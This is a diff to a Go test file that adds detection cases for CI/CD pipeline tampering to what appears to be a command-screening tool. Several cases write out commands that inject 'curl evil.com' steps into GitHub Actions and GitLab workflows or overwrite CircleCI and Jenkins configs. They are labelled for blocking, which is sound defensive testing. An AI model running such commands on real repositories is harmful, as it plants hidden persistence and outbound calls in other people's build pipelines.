@@ -87,9 +87,103 @@ var CrontabModificationCases = []TestCase{
 	},
 }
 
+// ---------------------------------------------------------------------------
+// Category 6.2: CI/CD Pipeline Tampering
+// Taxonomy: persistence-evasion/cicd-tampering/*
+// ---------------------------------------------------------------------------
+
+// CICDTamperingCases tests detection of CI/CD pipeline configuration modifications.
+// Taxonomy: persistence-evasion/cicd-tampering/pipeline-config-write
+var CICDTamperingCases = []TestCase{
+
+	// --- TRUE POSITIVES ---
+
+	{
+		ID:               "TP-CICD-001",
+		Command:          `sed -i 's/npm test/npm test && curl evil.com/g' .github/workflows/ci.yml`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "persistence-evasion/cicd-tampering/pipeline-config-write",
+		Analyzer:         "regex",
+		Description:      `In-place edit of GitHub Actions workflow. Injects malicious step into CI pipeline.`,
+		Tags:             []string{"canonical", "critical"},
+	},
+	{
+		ID:               "TP-CICD-002",
+		Command:          `echo "  - run: curl http://evil.com/beacon" >> .github/workflows/deploy.yml`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "persistence-evasion/cicd-tampering/pipeline-config-write",
+		Analyzer:         "regex",
+		Description:      `Appending malicious step to GitHub Actions deploy workflow.`,
+		Tags:             []string{"critical"},
+	},
+	{
+		ID:               "TP-CICD-003",
+		Command:          `sed -i 's/script:/script:\n  - curl evil.com/' .gitlab-ci.yml`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "persistence-evasion/cicd-tampering/pipeline-config-write",
+		Analyzer:         "regex",
+		Description:      `In-place edit of GitLab CI config. Injects malicious step.`,
+		Tags:             []string{"critical"},
+	},
+	{
+		ID:               "TP-CICD-004",
+		Command:          `tee .circleci/config.yml << 'EOF'`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "persistence-evasion/cicd-tampering/pipeline-config-write",
+		Analyzer:         "regex",
+		Description:      `Overwriting CircleCI config with tee. Replaces entire pipeline.`,
+		Tags:             []string{"critical"},
+	},
+	{
+		ID:               "TP-CICD-005",
+		Command:          `cat > Jenkinsfile << 'EOF'`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "persistence-evasion/cicd-tampering/pipeline-config-write",
+		Analyzer:         "regex",
+		Description:      `Overwriting Jenkinsfile with redirect. Replaces entire pipeline definition.`,
+		Tags:             []string{"critical"},
+	},
+
+	// --- TRUE NEGATIVES ---
+
+	{
+		ID:               "TN-CICD-001",
+		Command:          `cat .github/workflows/ci.yml`,
+		ExpectedDecision: "ALLOW",
+		Classification:   "TN",
+		TaxonomyRef:      "persistence-evasion/cicd-tampering/pipeline-config-write",
+		Description:      `Reading CI config is a safe read-only operation. cat is on the allow list.`,
+		Tags:             []string{"common-dev-operation"},
+	},
+	{
+		ID:               "TN-CICD-002",
+		Command:          `git diff .github/workflows/`,
+		ExpectedDecision: "ALLOW",
+		Classification:   "TN",
+		TaxonomyRef:      "persistence-evasion/cicd-tampering/pipeline-config-write",
+		Description:      `git diff on workflow directory is a safe read-only review operation. Matched by allow-safe-readonly.`,
+		Tags:             []string{"common-dev-operation"},
+	},
+	{
+		ID:               "TN-CICD-003",
+		Command:          `cat .gitlab-ci.yml`,
+		ExpectedDecision: "ALLOW",
+		Classification:   "TN",
+		TaxonomyRef:      "persistence-evasion/cicd-tampering/pipeline-config-write",
+		Description:      `Reading GitLab CI config is a safe read-only operation.`,
+		Tags:             []string{"common-dev-operation"},
+	},
+}
+
 // AllPersistenceEvasionCases returns all test cases for Kingdom 6.
 func AllPersistenceEvasionCases() []TestCase {
 	var all []TestCase
 	all = append(all, CrontabModificationCases...)
+	all = append(all, CICDTamperingCases...)
 	return all
 }
